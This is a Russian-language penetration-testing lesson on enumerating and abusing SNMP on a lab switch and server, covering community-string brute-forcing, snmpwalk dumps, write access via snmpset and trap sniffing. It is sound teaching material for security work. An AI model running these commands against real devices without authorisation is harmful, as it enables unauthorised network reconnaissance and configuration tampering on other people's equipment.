## Вопрос, с которого всё начинается

В прошлых уроках мы смотрели на серверы и их порты. Но в сети есть устройства, у которых нет привычных «сервисов»: коммутаторы, роутеры, принтеры, ИБП. Управлять ими и следить за ними администраторы привыкли через один протокол — **SNMP**. И у этого протокола есть особенность: в старых версиях «пароль» передаётся по сети в открытом виде.

Если пароль слабый, любой, кто его узнал, получает полную карту устройства: модель, версию прошивки, интерфейсы, таблицу соседей — а иногда и право менять конфигурацию. Как это работает и что реально можно вытащить, разберём на нашем коммутаторе.

## Наш пример: коммутатор 10.10.0.5

`nmap` показал на `10.10.0.5` открытый **UDP-порт 161** — это и есть SNMP:

```
$ sudo nmap -sU -p 161 --script snmp-info 10.10.0.5
PORT    STATE SERVICE
161/udp open  snmp
| snmp-info:
|   enterprise: ciscoSystems
|   engineID: 800000090300C2...
|   version: 2
```

Два новых слова: **UDP** — протокол без установления соединения (мы просто шлём датаграмму и не подтверждаем доставку), а **порт 161** — стандартный порт для SNMP-запросов. Уведомления от устройства (traps) идут на другой порт — **162**.

## Шаг 1: SNMP — это «менеджер», «агент» и дерево OID

Прежде чем что-то вытаскивать, поймём модель. SNMP — это архитектура из трёх частей:

- **Менеджер** — система мониторинга (Zabbix, LibreNMS), которая опрашивает устройства.
- **Агент** — демон на самом устройстве (`snmpd` на Linux, встроенный SNMP у Cisco), который отвечает.
- **MIB** — база описаний объектов. Сами данные лежат в дереве **OID** (Object Identifier) — числовых адресов вроде `1.3.6.1.2.1.1.5`, который называется `sysName`.

Вместо пароля SNMPv1/v2c использует **community-строку** — слово, которое передаётся в открытом виде. Оно же задаёт права: `ro` (только чтение) или `rw` (чтение и запись). Традиционно строка `private` даёт `rw`.

## Шаг 2: подбираем community-строку

Раз пароль — это просто слово, попробуем типовые. Инструмент `onesixtyone` быстро проверяет список community по UDP:

```
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.0.5
Scanning 1 hosts, 122 communities
10.10.0.5 [public]
```

Сработала строка `public`. Это **маленький** список типовых значений — `public`, `private`, `cisco`, `manager`, названия компании. Большие словари здесь не нужны: UDP медленный и шумный, а массовый перебор — трата времени и засвет.

## Шаг 3: собираем общую картину одним инструментом

Есть удобная утилита `snmp-check`, которая сама обходит ключевые ветки и печатает читаемый отчёт:

```
$ snmp-check 10.10.0.5 -c public
[+] System information:
    Hostname: sw-floor3
    Description: Cisco IOS Software, C2960 Software, Version 15.0(2)SE
    Contact: admin / Passw0rd!
    Location: 3rd floor comms room
[+] Network interfaces:
    FastEthernet0/1  ... up
    GigabitEthernet0/1 ... up
[+] ARP table:
    10.10.0.12  00:50:56:A1:2B:3C
    10.10.0.31  00:50:56:A1:44:88
```

Смотри на поле `Contact` — администратор вписал туда `admin / Passw0rd!`. Это не выдумка: люди регулярно оставляют в контакте и локации учётки «чтобы не забыть». И заодно мы бесплатно получили **ARP-таблицу** — список живых хостов сегмента, не отправив ни одного сканирующего пакета.

## Шаг 4: точечно ходим по дереву OID

`snmp-check` даёт обзор, а детали добираем `snmpwalk` — он идёт по ветке дерева и печатает все значения. Вот главные ветки:

```
$ snmpwalk -v2c -c public 10.10.0.5 1.3.6.1.2.1.1
SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, C2960 ...
SNMPv2-MIB::sysName.0  = STRING: sw-floor3
SNMPv2-MIB::sysContact.0 = STRING: admin / Passw0rd!

$ snmpwalk -v2c -c public 10.10.0.5 1.3.6.1.2.1.2.2.1.2
IF-MIB::ifDescr.1  = STRING: FastEthernet0/1
IF-MIB::ifDescr.24 = STRING: GigabitEthernet0/1

$ snmpwalk -v2c -c public 10.10.0.5 1.3.6.1.2.1.3.1.1.2
IP-MIB::ipNetToMediaPhysAddress.5.10.10.0.12 = STRING: 0:50:56:a1:2b:3c
```

Первая ветка (`1.3.6.1.2.1.1`, `system`) — про устройство; вторая (`...2.2`, `ifTable`) — интерфейсы; третья (`...3.1.1`, ARP) — соседи. По этим данным строим топологию: сколько портов, кто в сегменте.

## Шаг 5: ищем процессы, ПО и новые хосты

На серверах (Linux/Windows с установленным `snmpd`) SNMP отдаёт куда больше — списки процессов и установленного ПО:

```
$ snmpwalk -v2c -c public 10.10.0.40 1.3.6.1.2.1.25.4.2.1.2
HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: systemd
HOST-RESOURCES-MIB::hrSWRunName.812 = STRING: nginx
HOST-RESOURCES-MIB::hrSWRunName.905 = STRING: mysqld

$ snmpwalk -v2c -c public 10.10.0.40 1.3.6.1.2.1.25.6.3.1.2
HOST-RESOURCES-MIB::hrSWInstalledName.1 = STRING: Apache httpd 2.4.49
```

Версия `httpd 2.4.49` сразу подсказывает конкретную известную уязвимость. Так SNMP становится источником версий для поиска эксплойтов.

## Шаг 6: а если community даёт запись?

Проверим `private` — традиционную `rw`-строку:

```
$ snmpget -v2c -c private 10.10.0.5 1.3.6.1.2.1.1.5.0
SNMPv2-MIB::sysName.0 = STRING: sw-floor3
```

Ответ пришёл — значит `private` валидна. С ней можно **менять** параметры через операцию `SET`:

```
$ snmpset -v2c -c private 10.10.0.5 1.3.6.1.2.1.1.6.0 s "hacked"
SNMPv2-MIB::sysLocation.0 = STRING: hacked
```

`SET` меняет значения OID. На некоторых устройствах через vendor-MIB можно даже залить конфиг или включить telnet — это путь к полному контролю над железом.

## Шаг 7: SNMPv3 — и почему он не всегда спасает

Современная замена — **SNMPv3**. Вместо одной строки у него есть пользователи и три уровня безопасности:

| Уровень | Что даёт |
|---|---|
| `noAuthNoPriv` | только имя пользователя, без пароля и шифрования |
| `authNoPriv` | аутентификация по HMAC (MD5/SHA), но данные открыты |
| `authPriv` | аутентификация **и** шифрование (DES/AES) |

Защищён по-настоящему только `authPriv`. Уровень `noAuthNoPriv` практически так же уязвим, как v2c: перехватив пакет, читаешь всё. Проверить, есть ли шифрование, можно, опросив v3-пользователя без пароля:

```
$ snmpwalk -v3 -l noAuthNoPriv -u monitor 10.10.0.5 1.3.6.1.2.1.1.5
SNMPv2-MIB::sysName.0 = STRING: sw-floor3
```

Прошло без пароля — значит, трафик не защищён.

## Шаг 8: traps — то, что устройство рассказывает само

Кроме опроса, SNMP умеет **push**: агент отправляет `TRAP` на UDP/162 при событии — link up/down, перезагрузка, вход пользователя. Для разведки это ценно: если есть доступ к менеджеру мониторинга (Zabbix, LibreNMS), получаешь историческую телеметрию всей сети. А перехват UDP/162 в сегменте мониторинга может выдать имена пользователей и фрагменты конфигурации без единого активного запроса:

```
$ sudo tcpdump -i eth0 udp port 162 -A
... sysName=sw-floor3 user=admin ...
```

## Что мы теперь знаем

По-простому:

1. SNMP управляет сетевым оборудованием; запросы идут на UDP/161, traps — на UDP/162.
2. В v1/v2c «пароль» — это community-строка, передаваемая открыто; она же задаёт ro/rw.
3. `onesixtyone` подбирает community, `snmp-check` даёт общий отчёт, `snmpwalk` — детали.
4. Из SNMP достают модель, прошивку, интерфейсы, ARP, процессы, установленное ПО и иногда пароли в `sysContact`.
5. `rw`-строка (часто `private`) позволяет менять конфигурацию через `SET`.

## На что смотреть дальше

- **Не забудь про UDP.** `nmap` по умолчанию сканирует TCP — без `-sU -p 161` ты SNMP просто не увидишь.
- **Не останавливайся на `public`.** Проверь `private` и вендорные строки.
- **Перехватывай traps (UDP/162).** Они иногда содержат имена пользователей и фрагменты конфигурации.
